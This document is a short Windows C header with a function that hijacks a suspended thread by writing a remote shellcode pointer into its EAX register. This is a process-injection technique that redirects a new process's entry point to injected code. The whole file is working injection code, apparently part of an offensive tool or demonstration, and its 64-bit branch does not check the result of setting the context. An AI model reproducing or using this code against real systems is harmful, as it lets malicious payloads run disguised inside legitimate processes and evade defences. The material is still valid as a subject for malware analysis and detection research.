#pragma once

#include <Windows.h>

//32-bit version
bool patch_context(HANDLE hThread, LPVOID remote_shellcode_ptr)
{
    //get initial context of the target:
    BOOL res = FALSE;

#if defined(_WIN64)
    WOW64_CONTEXT context;
    memset(&context, 0, sizeof(WOW64_CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    res = Wow64GetThreadContext(hThread, &context);
#else	
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    res = GetThreadContext(hThread, &context);
#endif
    if (res == FALSE) {
        return false;
    }

    //if the process was created as suspended and didn't run yet, EAX holds it's entry point:
    context.Eax = (DWORD) remote_shellcode_ptr;

#if defined(_WIN64)
    Wow64SetThreadContext(hThread, &context);
#else
    res = SetThreadContext(hThread, &context);
#endif
    if (res == FALSE) {
        return false;
    }
    printf("patched context -> EAX = %x\n", context.Eax);
    return true;
}
